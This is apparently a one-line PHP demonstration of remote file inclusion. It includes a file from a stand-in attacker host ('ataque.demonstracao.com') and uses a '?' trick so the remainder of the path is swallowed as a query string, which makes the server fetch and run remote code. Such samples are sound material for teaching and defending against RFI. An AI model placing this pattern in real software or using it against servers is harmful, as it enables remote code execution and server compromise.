<?php

include "http://ataque.demonstracao.com/ataque.inc?/header.inc";

?>